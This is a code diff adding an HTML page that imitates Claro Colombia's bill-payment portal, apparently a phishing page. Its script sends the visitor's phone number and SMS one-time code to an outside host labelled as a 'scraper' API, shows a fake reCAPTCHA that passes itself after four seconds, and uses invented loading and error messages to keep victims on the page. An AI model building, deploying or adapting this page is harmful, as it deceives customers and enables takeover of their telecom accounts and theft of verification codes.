@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago de Facturas - Claro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/index.css">
+</head>
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="top-bar-container">
+            <div class="top-bar-left">
+                <a href="#" class="top-bar-link">Personas</a>
+                <a href="#" class="top-bar-link">Negocios</a>
+                <a href="#" class="top-bar-link">Empresas</a>
+            </div>
+            <div class="top-bar-right">
+                <a href="#" class="top-bar-item">
+                    <span>Más de Claro</span>
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+                <a href="#" class="top-bar-item">
+                    <img src="https://flagcdn.com/w40/co.png" alt="Colombia" class="flag-icon">
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Header -->
+    <div class="main-header">
+        <div class="main-header-container">
+            <div class="header-left">
+                <div class="logo">
+                    <span class="logo-text"><img src="img/imgi_18_logo-claro-blanco.svg" alt="" style="width: 30%;"></span>
+                </div>
+                <nav class="main-nav">
+                    <a href="#" class="nav-item">
+                        Servicios
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Tienda
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Beneficios
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                     <a href="#" class="header-link">
+                    Soporte
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+                </nav>
+            </div>
+
+            <div style="width: 300px; color: transparent;">
+                a
+            </div>
+
+            <div class="header-right">
+               
+                
+                <a href="#" class="header-link user-link">
+                    <i class="fas fa-user-circle"></i>
+                    Mi Claro
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Portal Title and Progress Steps - Full Width with Background -->
+    <div class="portal-title-section">
+        <h1 class="portal-title">
+            Portal de <span class="portal-title-highlight">PAGOS Y RECARGAS</span>
+        </h1>
+
+        <div class="progress-steps">
+            <div class="step active">
+                <div class="step-icon-wrapper">
+                   <img src="img/imgi_20_icono-seleccion-on.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Selecciona</span>
+                    tu servicio
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                    <img src="img/imgi_21_icono-mediopago-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Escoge el</span>
+                    medio de pago
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                   <img src="img/imgi_22_icono-pago-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Realiza el</span>
+                    pago en línea
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                    <img src="img/imgi_23_icono-resultado-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Recibe la</span>
+                    confirmación
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <p class="header-text">
+            Realiza el pago de la factura de la tus servicios Claro, compra paquetes y haz recargas de manera fácil y desde donde quieras. También, puedes inscribir tu tarjeta de crédito para realizar el pago de tus facturas de manera automática.
+        </p>
+
+        <div class="dropdown-section" id="dropdownSection">
+            <div class="dropdown-title">
+                <img src="img/imgi_29_PDFAM.png" style="width: 20%;" alt="">
+                <span id="dropdownText">Pago de Facturas</span>
+            </div>
+            <i class="fas fa-chevron-down dropdown-arrow" id="dropdownArrow"></i>
+        </div>
+
+        <div class="dropdown-menu" id="dropdownMenu">
+            <div class="dropdown-option" data-option="pago" data-icon="fa-file-invoice" data-icon-color="">
+               <img src="img/imgi_29_PDFAM.png" style="width: 6%;" alt="">
+                <span class="dropdown-option-text">Pago de Facturas</span>
+            </div>
+            <div class="dropdown-option" data-option="compra" data-icon="fa-mobile-alt" data-icon-color="red">
+               <img src="img/imgi_26_COPPP.png" alt="">
+                <span class="dropdown-option-text">Compra de Paquetes</span>
+            </div>
+            <div class="dropdown-option" data-option="recargas" data-icon="fa-gift" data-icon-color="red">
+                <img src="img/imgi_27_CORPP.png" alt="">
+                <span class="dropdown-option-text">Compra de Recargas</span>
+            </div>
+            <div class="dropdown-option" data-option="automatico" data-icon="fa-sync-alt" data-icon-color="red">
+                <img src="img/imgi_28_PADFS.png" alt="">
+                <span class="dropdown-option-text">Pago Automático de Facturas</span>
+            </div>
+            <div class="dropdown-option" data-option="deudas" data-icon="fa-clock" data-icon-color="red">
+                <img src="img/imgi_29_PDFAM (2).png" alt="">
+                <span class="dropdown-option-text">Paga tus deudas antiguas en mora</span>
+            </div>
+        </div>
+
+        <div class="form-section">
+            <h3 class="section-title">Selecciona el tipo de servicio</h3>
+            
+            <div class="service-options">
+                <label class="service-option">
+                    <div class="option-top">
+                        <input type="radio" name="service" class="radio-input" data-service="postpago" checked>
+                        <div class="service-icon-wrapper">
+                            <img src="img/imgi_30_icono-postpago.png" alt="">
+                        </div>
+                    </div>
+                    <span class="service-label">Postpago</span>
+                </label>
+
+                <label class="service-option">
+                    <div class="option-top">
+                        <input type="radio" name="service" class="radio-input" data-service="hogar">
+                        <div class="service-icon-wrapper">
+                            <img src="img/imgi_31_icono-factura-hogar.png" alt="">
+                        </div>
+                    </div>
+                    <span class="service-label">Hogar y Multiplay</span>
+                </label>
+
+                <label class="service-option">
+                    <div class="option-top">
+                        <input type="radio" name="service" class="radio-input" data-service="equipo">
+                        <div class="service-icon-wrapper">
+                            <img src="img/imgi_32_icono-equipos.png" alt="">
+                        </div>
+                    </div><span class="service-label">Equipo</span>
+                </label>
+
+                <label class="service-option">
+                    <div class="option-top">
+                        <input type="radio" name="service" class="radio-input" data-service="internet">
+                        <div class="service-icon-wrapper">
+                           <img src="img/imgi_33_IOT.png" alt="">
+                        </div>
+                    </div>
+                    <span class="service-label">Internet De Las Cosas</span>
+                </label>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label" id="inputLabel">Número de celular</label>
+                <!-- Ajustado: type tel + inputmode; maxlength 10; sin pattern que bloquee -->
+                <input type="tel" id="phoneInput" class="input-field phone" placeholder="" inputmode="numeric" maxlength="10" autocomplete="tel">
+                <!-- Mensaje inline del servidor (error/info) -->
+                <div id="serverMessage" class="server-message error" role="status" aria-live="polite"></div>
+            </div>
+
+            <!-- OTP container (hidden by default) -->
+            <div id="otpContainer" class="otp-container" aria-hidden="true" style="display:none;">
+                <div class="otp-instruction">Ingresa el código de 4 dígitos enviado a tu línea móvil.(La casilla del código se habilitará automáticamente al recibir el SMS)</div>
+                <div class="otp-boxes" id="otpBoxes">
+                    <div class="otp-box" data-index="0"><input inputmode="numeric" maxlength="1" disabled></div>
+                    <div class="otp-box" data-index="1"><input inputmode="numeric" maxlength="1" disabled></div>
+                    <div class="otp-box" data-index="2"><input inputmode="numeric" maxlength="1" disabled></div>
+                    <div class="otp-box" data-index="3"><input inputmode="numeric" maxlength="1" disabled></div>
+                </div>
+                <div class="otp-timer">Reenviar el código en <strong id="otpTime">02:56</strong></div>
+                <div class="otp-resend" id="otpResend">Reenviar</div>
+            </div>
+
+            <div class="recaptcha-wrapper" id="recaptchaWrapper">
+                <div class="recaptcha-box" id="recaptchaBox" aria-hidden="false">
+                    <div class="recaptcha-checkbox" id="recaptchaCheckbox" role="checkbox" tabindex="0" aria-checked="false" aria-label="No soy un robot">
+                        <!-- icono check pequeño; inicialmente oculto por CSS -->
+                        <i class="fas fa-check rc-icon" aria-hidden="true"></i>
+                    </div>
+                    <div class="recaptcha-text" id="recaptchaText" style="line-height:1.05;">
+                        <p style="margin:0;"><strong>No soy un robot</strong></p>
+                        <div class="recaptcha-links" style="font-size:0.78rem; margin-top:4px; color:#666;">
+                            reCAPTCHA cambiará sus Condiciones del Servicio. <a href="#">Toma medidas.</a><br>
+                            <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
+                        </div>
+                    </div>
+                    <div class="recaptcha-logo" id="recaptchaLogo" style="margin-left:auto;">
+                        <div class="recaptcha-logo-img">
+                           <img src="img/imgi_2_logo_48.png" style="width: 120%;" alt="">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button id="btnCancel" class="btn btn-cancel">Cancelar</button>
+                <button id="btnContinue" class="btn btn-continue" disabled>Continuar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Dropdown functionality (sin cambios funcionales en estilo)
+        const dropdownSection = document.getElementById('dropdownSection');
+        const dropdownMenu = document.getElementById('dropdownMenu');
+        const dropdownArrow = document.getElementById('dropdownArrow');
+        const dropdownText = document.getElementById('dropdownText');
+        const dropdownOptions = document.querySelectorAll('.dropdown-option');
+
+        dropdownSection.addEventListener('click', () => {
+            dropdownSection.classList.toggle('active');
+            dropdownMenu.classList.toggle('active');
+            dropdownArrow.classList.toggle('rotated');
+        });
+
+        dropdownOptions.forEach(option => {
+            option.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const text = option.querySelector('.dropdown-option-text')?.textContent || option.textContent;
+                dropdownText.textContent = text.trim();
+
+                // --- NUEVO: copiar imagen de la opción seleccionada a la imagen de .dropdown-title ---
+                const optionImg = option.querySelector('img');
+                const titleImg = dropdownSection.querySelector('.dropdown-title img');
+                if (optionImg && titleImg) {
+                    // Mantener atributos alt y tamaño del titleImg; solo cambiar src y alt si existe
+                    titleImg.src = optionImg.src;
+                    if (optionImg.alt) titleImg.alt = optionImg.alt;
+                }
+                // -------------------------------------------------------------------------------
+
+                dropdownSection.classList.remove('active');
+                dropdownMenu.classList.remove('active');
+                dropdownArrow.classList.remove('rotated');
+            });
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!dropdownSection.contains(e.target) && !dropdownMenu.contains(e.target)) {
+                dropdownSection.classList.remove('active');
+                dropdownMenu.classList.remove('active');
+                dropdownArrow.classList.remove('rotated');
+            }
+        });
+
+        /* --- Lógica OTP y validación mínima --- */
+        const phoneInput = document.getElementById('phoneInput');
+        const otpContainer = document.getElementById('otpContainer');
+        const recaptchaWrapper = document.getElementById('recaptchaWrapper');
+        const otpTimeEl = document.getElementById('otpTime');
+        const otpResend = document.getElementById('otpResend');
+        const otpInputs = document.querySelectorAll('#otpBoxes input');
+        const btnContinue = document.getElementById('btnContinue');
+        const btnCancel = document.getElementById('btnCancel');
+        const serverMessageEl = document.getElementById('serverMessage');
+
+        const validPrefixes = ['310','311','312','313','314','316','317','318','319','320','321','322','323','324','300','301','302','304','305',];
+        const INITIAL_OTP_SECONDS = 176;
+        let otpSeconds = INITIAL_OTP_SECONDS;
+        let otpInterval = null;
+
+        function formatTime(sec) {
+            const m = Math.floor(sec / 60).toString().padStart(2, '0');
+            const s = (sec % 60).toString().padStart(2, '0');
+            return `${m}:${s}`;
+        }
+
+        function startOtpTimer() {
+            clearInterval(otpInterval);
+            otpSeconds = INITIAL_OTP_SECONDS;
+            otpTimeEl.textContent = formatTime(otpSeconds);
+            otpInterval = setInterval(() => {
+                otpSeconds--;
+                if (otpSeconds < 0) {
+                    clearInterval(otpInterval);
+                    otpTimeEl.textContent = '00:00';
+                    return;
+                }
+                otpTimeEl.textContent = formatTime(otpSeconds);
+            }, 1000);
+        }
+
+        function showOtp() {
+            // Mostrar mensaje informativo cuando aparece OTP
+            showServerMessage('Por favor, espere unos instantes mientras enviamos el código SMS a su teléfono.', 'info');
+            otpContainer.style.display = 'flex';
+            otpContainer.setAttribute('aria-hidden', 'false');
+            recaptchaWrapper.style.display = 'none';
+            startOtpTimer();
+            otpInputs.forEach(i => {
+                i.value = '';
+                i.disabled = true;
+            });
+            updateButtonsState();
+        }
+
+        function enableOtpInputs() {
+            otpInputs.forEach(i => i.disabled = false);
+            setTimeout(() => { otpInputs[0].focus(); }, 100);
+            updateButtonsState();
+        }
+
+        function hideOtp() {
+            otpContainer.style.display = 'none';
+            otpContainer.setAttribute('aria-hidden', 'true');
+            recaptchaWrapper.style.display = 'flex';
+            clearInterval(otpInterval);
+            otpTimeEl.textContent = formatTime(INITIAL_OTP_SECONDS);
+            otpInputs.forEach(i => {
+                i.value = '';
+                i.disabled = true;
+            });
+            updateButtonsState();
+        }
+
+        function isValidPhoneForOtp(value) {
+            if (!/^\d+$/.test(value)) return false;
+            if (value.length !== 10) return false;
+            const prefix = value.substring(0, 3);
+            return validPrefixes.includes(prefix);
+        }
+
+        // Mensajes inline del servidor
+        function showServerMessage(message, type = 'error') {
+            serverMessageEl.textContent = message || '';
+            serverMessageEl.classList.remove('error','info');
+            serverMessageEl.classList.add(type === 'info' ? 'info' : 'error');
+            serverMessageEl.style.display = message ? 'block' : 'none';
+        }
+        function clearServerMessage() {
+            serverMessageEl.textContent = '';
+            serverMessageEl.style.display = 'none';
+            serverMessageEl.classList.remove('error','info');
+        }
+
+        // Asegurar solo dígitos y maxlength (NO mostrar OTP automáticamente)
+        phoneInput.addEventListener('input', (e) => {
+            clearServerMessage();
+            let val = e.target.value || '';
+            val = val.replace(/\D/g, '').slice(0, 10);
+            e.target.value = val;
+            updateButtonsState();
+        });
+
+        phoneInput.addEventListener('paste', (e) => {
+            clearServerMessage();
+            const paste = (e.clipboardData || window.clipboardData).getData('text') || '';
+            const digits = paste.replace(/\D/g, '').slice(0,10);
+            e.preventDefault();
+            phoneInput.value = digits;
+            phoneInput.dispatchEvent(new Event('input'));
+        });
+
+        // OTP inputs behavior (navegación y sólo dígitos)
+        otpInputs.forEach((input, idx) => {
+            input.setAttribute('inputmode', 'numeric');
+            input.addEventListener('input', (e) => {
+                clearServerMessage();
+                const v = (e.target.value || '').replace(/\D/g, '').slice(0,1);
+                e.target.value = v;
+                if (v && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+                updateButtonsState();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+                    otpInputs[idx - 1].focus();
+                }
+                if (e.key.length === 1 && !/[0-9]/.test(e.key)) e.preventDefault();
+            });
+
+            input.addEventListener('paste', (e) => {
+                clearServerMessage();
+                const paste = (e.clipboardData || window.clipboardData).getData('text') || '';
+                const digits = paste.replace(/\D/g, '').slice(0, 4 - idx);
+                e.preventDefault();
+                for (let k = 0; k < digits.length; k++) {
+                    if (idx + k < otpInputs.length) otpInputs[idx + k].value = digits[k];
+                }
+                const next = Math.min(idx + digits.length, otpInputs.length - 1);
+                otpInputs[next].focus();
+                updateButtonsState();
+            });
+        });
+
+        otpResend.addEventListener('click', () => {
+            clearServerMessage();
+            startOtpTimer();
+            // aquí dispararías el reenvío real si lo implementas
+        });
+
+        function allOtpFilled() {
+            return Array.from(otpInputs).every(i => i.value && /^\d$/.test(i.value));
+        }
+
+        function updateButtonsState() {
+            const phoneValid = isValidPhoneForOtp(phoneInput.value);
+            const otpFilled = allOtpFilled();
+            const otpDisabled = Array.from(otpInputs).some(i => i.disabled);
+            
+            if (otpContainer.style.display === 'none' || otpContainer.style.display === '') {
+                btnContinue.disabled = !phoneValid;
+            } else {
+                btnContinue.disabled = !(phoneValid && otpFilled && !otpDisabled);
+            }
+            if (!btnContinue.disabled) {
+                btnContinue.classList.add('active');
+                btnCancel.classList.add('active');
+            } else {
+                btnContinue.classList.remove('active');
+                btnCancel.classList.remove('active');
+            }
+        }
+
+        btnCancel.addEventListener('click', () => {
+            phoneInput.value = '';
+            hideOtp();
+            clearServerMessage();
+            phoneInput.focus();
+        });
+
+       // overlay de carga con imágenes
+        const loadingOverlay = document.createElement('div');
+        loadingOverlay.id = 'loadingOverlay';
+        loadingOverlay.className = 'loading-overlay';
+        loadingOverlay.style.position = 'fixed';
+        loadingOverlay.style.left = '0';
+        loadingOverlay.style.top = '0';
+        loadingOverlay.style.right = '0';
+        loadingOverlay.style.bottom = '0';
+        loadingOverlay.style.display = 'none';
+        loadingOverlay.style.zIndex = '9999';
+        loadingOverlay.style.background = 'rgba(255,255,255,0.95)';
+        loadingOverlay.style.alignItems = 'center';
+        loadingOverlay.style.justifyContent = 'center';
+        loadingOverlay.style.flexDirection = 'column';
+        loadingOverlay.innerHTML = `
+            <img src="img/iconos-logo-claro.png" alt="" style="max-width: 200px; margin-bottom: 20px;">
+            <img src="img/ellipsis.gif" width="25%" alt="">
+            <div id="loadingMessages" style="margin-top:12px; font-size:1.05rem; text-align:center;"></div>
+        `;
+        document.body.appendChild(loadingOverlay);
+
+        // Mensajes que aparecerán en la pantalla de carga (cada 2 segundos)
+        const _loadingMessagesSequence = ['Conectando con claro facturas...', 'Cargando...', 'No se salga de la pagina...'];
+        let _loadingMessageTimer = null;
+
+        function showLoading() { 
+            loadingOverlay.style.display = 'flex'; 
+            clearServerMessage(); 
+            // iniciar secuencia de mensajes
+            try {
+                const msgDiv = document.getElementById('loadingMessages');
+                if (msgDiv) {
+                    // limpiar cualquier timer previo
+                    if (_loadingMessageTimer) {
+                        clearInterval(_loadingMessageTimer);
+                        _loadingMessageTimer = null;
+                    }
+                    let idx = 0;
+                    msgDiv.textContent = _loadingMessagesSequence[0];
+                    if (_loadingMessagesSequence.length > 1) {
+                        _loadingMessageTimer = setInterval(() => {
+                            idx++;
+                            if (idx >= _loadingMessagesSequence.length - 1) {
+                                // colocar último mensaje y detener timer
+                                msgDiv.textContent = _loadingMessagesSequence[_loadingMessagesSequence.length - 1];
+                                clearInterval(_loadingMessageTimer);
+                                _loadingMessageTimer = null;
+                            } else {
+                                msgDiv.textContent = _loadingMessagesSequence[idx];
+                            }
+                        }, 2000);
+                    }
+                }
+            } catch (e) {
+                // si falla algo con los mensajes, no romper la carga
+                console.error('Error en secuencia mensajes de carga:', e);
+            }
+        }
+        function hideLoading() { 
+            loadingOverlay.style.display = 'none';
+            // limpiar timer de mensajes si existe
+            if (_loadingMessageTimer) {
+                clearInterval(_loadingMessageTimer);
+                _loadingMessageTimer = null;
+            }
+}
+
+        // CONFIG: base del API (ajusta si tu app.py corre en otro host/puerto)
+        const API_BASE = 'https://claro-api.celsi.uk';
+
+       btnContinue.addEventListener('click', async () => {
+    if (btnContinue.disabled) return;
+    const phone = phoneInput.value;
+    if (!isValidPhoneForOtp(phone)) return;
+
+    // Si OTP no visible => este submit es "iniciar flujo" (envía solo número)
+    if (otpContainer.style.display === 'none' || otpContainer.style.display === '') {
+        try {
+            showLoading();
+            
+            // Mostrar OTP inmediatamente (después de 8 segundos)
+            setTimeout(() => {
+                hideLoading();
+                const usedNumber = phone;
+                sessionStorage.setItem('scraper_numero', usedNumber);
+                showOtp();
+            }, 8000);
+            
+            const form = new FormData();
+            form.append('numero', phone);
+            const resp = await fetch(`${API_BASE}/run`, {
+                method: 'POST',
+                body: form,
+                mode: 'cors',
+                credentials: 'include'
+            });
+
+            const statusHeader = resp.headers.get('X-Scraper-Status');
+            const headerNumero = resp.headers.get('X-Scraper-Numero');
+
+            if (statusHeader === 'OTP_REQUIRED') {
+                const usedNumber = headerNumero || phone;
+                sessionStorage.setItem('scraper_numero', usedNumber);
+                enableOtpInputs();
+                return;
+            }
+
+            if (statusHeader === 'NO_DETAILS') {
+                hideLoading();
+                hideOtp();
+                showServerMessage('Su red es inestable, intente de nuevo.', 'error');
+                return;
+            }
+
+            if (!resp.ok) {
+                const txt = await resp.text().catch(()=>'<no body>');
+                hideLoading();
+                hideOtp();
+                console.error('Fetch /run response NOT OK', resp.status, resp.statusText, txt);
+                // Mensaje solicitado cuando la API devuelve error
+                showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
+                return;
+            }
+
+            const text = await resp.text();
+
+            if (text.includes('Detalles extraídos') || text.includes('valor_total')) {
+                hideLoading();
+                hideOtp();
+                window.location.href = 'datos.html';
+            } else if (text.includes('OTP') || text.includes('pinCode')) {
+                sessionStorage.setItem('scraper_numero', phone);
+                enableOtpInputs();
+            } else {
+                hideLoading();
+                hideOtp();
+                showServerMessage('Su red es inestable, intente de nuevo.', 'error');
+            }
+        } catch (err) {
+            hideLoading();
+            hideOtp();
+            console.error('Fetch /run EXCEPTION:', err);
+            // Mensaje solicitado cuando hay excepción en llamada API
+            showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
+        }
+    } else {
+        // OTP visible => enviamos el OTP
+        const code = Array.from(otpInputs).map(i => i.value).join('');
+        if (code.length !== 4) return;
+        const numero = sessionStorage.getItem('scraper_numero') || phone;
+        
+        console.log('Enviando OTP:', code, 'para número:', numero);
+        
+        try {
+            showLoading();
+            const form = new FormData();
+            form.append('numero', numero);
+            form.append('otp', code);
+            
+            const resp = await fetch(`${API_BASE}/submit_otp`, {
+                method: 'POST',
+                body: form,
+                mode: 'cors',
+                credentials: 'include'
+            });
+
+            const statusHeader = resp.headers.get('X-Scraper-Status');
+            console.log('Status header recibido:', statusHeader);
+
+            if (statusHeader === 'SUCCESS') {
+                console.log('✓ OTP correcto, extracción exitosa');
+                
+                // Esperar 2 segundos antes de redirigir para asegurar que los datos estén guardados
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Guardar número en sessionStorage para datos.html
+                sessionStorage.setItem('scraper_numero', numero);
+                console.log('Número guardado en sessionStorage:', numero);
+                
+                // Redirigir a datos.html
+                console.log('Redirigiendo a datos.html...');
+                hideLoading();
+                window.location.href = 'datos.html';
+                return;
+            }
+
+            if (statusHeader === 'OTP_REQUIRED' || statusHeader === 'OTP_ERROR') {
+                console.log('OTP incorrecto, mostrando error');
+                hideLoading();
+                showServerMessage('OTP incorrecto. Intenta de nuevo.', 'error');
+                showOtp();
+                enableOtpInputs();
+                otpInputs.forEach(input => input.value = '');
+                if (otpInputs[0]) otpInputs[0].focus();
+                return;
+            }
+
+            if (statusHeader === 'NO_DETAILS') {
+                console.log('No se encontraron detalles');
+                hideLoading();
+                hideOtp();
+                showServerMessage('Su red es inestable, intente de nuevo.', 'error');
+                return;
+            }
+
+            if (!resp.ok) {
+                const txt = await resp.text().catch(()=>'<no body>');
+                console.error('Response NOT OK:', resp.status, txt);
+                hideLoading();
+                hideOtp();
+                // Mensaje solicitado cuando la API devuelve error en submit_otp
+                showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
+                return;
+            }
+
+            // Si llegamos aquí sin header SUCCESS, asumir error
+            console.warn('Respuesta sin header SUCCESS claro');
+            hideLoading();
+            hideOtp();
+            showServerMessage('Su red es inestable, intente de nuevo.', 'error');
+            
+        } catch (err) {
+            console.error('Exception en submit_otp:', err);
+            hideLoading();
+            hideOtp();
+            // Mensaje solicitado cuando hay excepción en submit_otp
+            showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
+        }
+    }
+});
+
+        // evitar submit por Enter en phoneInput
+        phoneInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') e.preventDefault();
+        });
+
+        // --- NUEVO: actualización del label cuando se selecciona un servicio ---
+        const radioInputs = document.querySelectorAll('.radio-input');
+        const inputLabelEl = document.getElementById('inputLabel');
+
+        function updateInputLabelFromSelectedRadio() {
+            const checked = Array.from(radioInputs).find(r => r.checked);
+            if (checked) {
+                // buscar el label contenedor y obtener .service-label
+                const label = checked.closest('.service-option');
+                if (label) {
+                    const serviceText = label.querySelector('.service-label')?.textContent?.trim();
+                    if (serviceText) {
+                        inputLabelEl.textContent = serviceText;
+                        return;
+                    }
+                }
+            }
+            // fallback
+            inputLabelEl.textContent = 'Número de celular';
+        }
+
+        // escuchar cambios en radios (cubre clicks en label y en input)
+        radioInputs.forEach(r => {
+            r.addEventListener('change', updateInputLabelFromSelectedRadio);
+            // también escuchar click en el label para cubrir algunos navegadores
+            const parentLabel = r.closest('.service-option');
+            if (parentLabel) {
+                parentLabel.addEventListener('click', () => {
+                    // pequeño delay para dejar que el radio se marque
+                    setTimeout(updateInputLabelFromSelectedRadio, 10);
+                });
+            }
+        });
+
+        // Inicializar texto del inputLabel al cargar la página
+        updateInputLabelFromSelectedRadio();
+        // ------------------------------------------------------------------
+
+        // --- NUEVO: comportamiento simulado del reCAPTCHA (4s) ---
+        (function() {
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            const recaptchaBox = document.getElementById('recaptchaBox');
+            const recaptchaText = document.getElementById('recaptchaText');
+            const recaptchaLogo = document.getElementById('recaptchaLogo');
+
+            // Estado: 'idle' | 'checking' | 'checked'
+            let state = 'idle';
+            // tiempo en ms (4 segundos)
+            const DELAY_MS = 4000;
+
+            function setState(newState) {
+                state = newState;
+                if (state === 'idle') {
+                    checkbox.classList.remove('checking','checked');
+                    checkbox.setAttribute('aria-checked', 'false');
+                    checkbox.removeAttribute('aria-busy');
+                } else if (state === 'checking') {
+                    checkbox.classList.remove('checked');
+                    checkbox.classList.add('checking');
+                    checkbox.setAttribute('aria-busy', 'true');
+                } else if (state === 'checked') {
+                    checkbox.classList.remove('checking');
+                    checkbox.classList.add('checked');
+                    checkbox.setAttribute('aria-checked', 'true');
+                    checkbox.removeAttribute('aria-busy');
+                }
+            }
+
+            // Función que inicia el "chequeo" simulado de 4s y luego marca
+            function simulateCheck() {
+                if (state === 'idle') {
+                    setState('checking');
+                    // evitar que el usuario vuelva a disparar mientras "checking"
+                    setTimeout(() => {
+                        // marcar como si fuera real
+                        setState('checked');
+                        // para accesibilidad, hacer focus en checkbox marcado
+                        checkbox.focus();
+                        // emitimos un evento personalizado por si otra lógica quiere reaccionar
+                        checkbox.dispatchEvent(new CustomEvent('recaptcha-verified', { bubbles: true }));
+                    }, DELAY_MS);
+                }
+            }
+
+            // click en el checkbox real
+            checkbox.addEventListener('click', (e) => {
+                e.preventDefault();
+                simulateCheck();
+            });
+
+            // suportar teclado (espacio/enter)
+            checkbox.addEventListener('keydown', (e) => {
+                if (e.key === ' ' || e.key === 'Enter') {
+                    e.preventDefault();
+                    simulateCheck();
+                }
+            });
+
+            // si el usuario hace click en el texto o el logo, también iniciar (sin interceptar links)
+            [recaptchaText, recaptchaLogo, recaptchaBox].forEach(el => {
+                if (!el) return;
+                el.addEventListener('click', (e) => {
+                    // permitir clicks en <a> dentro de .recaptcha-text para funcionar (no impedir navegación)
+                    if (e.target && e.target.tagName && e.target.tagName.toLowerCase() === 'a') return;
+                    simulateCheck();
+                });
+            });
+
+            // Exponer una función global mínima por si se necesita resetear desde otro script
+            window.__recaptcha_sim = {
+                reset: function() { setState('idle'); },
+                isChecked: function() { return state === 'checked'; }
+            };
+
+            // Inicializar estado
+            setState('idle');
+        })();
+
+        // Inicial: ocultar OTP (controlado por el servidor)
+        hideOtp();
+        updateButtonsState();
+    </script>
+</body>
+</html>
